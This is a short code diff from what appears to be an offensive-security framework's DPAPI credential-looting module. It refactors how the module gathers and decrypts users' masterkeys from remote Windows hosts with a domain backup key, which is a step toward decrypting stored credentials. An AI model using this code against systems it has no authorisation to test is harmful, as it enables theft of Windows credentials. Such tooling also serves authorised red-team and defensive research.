@@ -97,25 +97,9 @@ class DpapiCredentials(AuxiliaryModule):
     def _loot_user(self, conn, host, user_dir, backup_key, store):
         # this user's masterkeys first — the credential blobs name the
         # key they need by guid (the filename in the Protect dir)
-        masterkeys = {}
-        protect = f"Users\\{user_dir}\\AppData\\Roaming\\Microsoft\\Protect"
-        for sid_dir in self._list(conn, f"{protect}\\*"):
-            if not sid_dir.startswith("S-"):
-                continue
-            for entry in self._list(conn, f"{protect}\\{sid_dir}\\*"):
-                if not dpapix.is_guid_name(entry):
-                    continue
-                data = self._read(conn, f"{protect}\\{sid_dir}\\{entry}")
-                if data is None:
-                    continue
-                try:
-                    guid, mk = dpapix.decrypt_masterkey_file(
-                        data, backup_key)
-                except Exception as e:
-                    self.print_debug(f"{host}: {user_dir}/{entry}: {e}")
-                    continue
-                if mk is not None:
-                    masterkeys[entry.lower()] = mk
+        masterkeys = dpapix.build_masterkey_map(
+            conn, user_dir, backup_key,
+            lambda m: self.print_debug(f"{host}: {m}"))
         found = 0
         for scope in ("Roaming", "Local"):
             cdir = f"Users\\{user_dir}\\AppData\\{scope}\\Microsoft" \
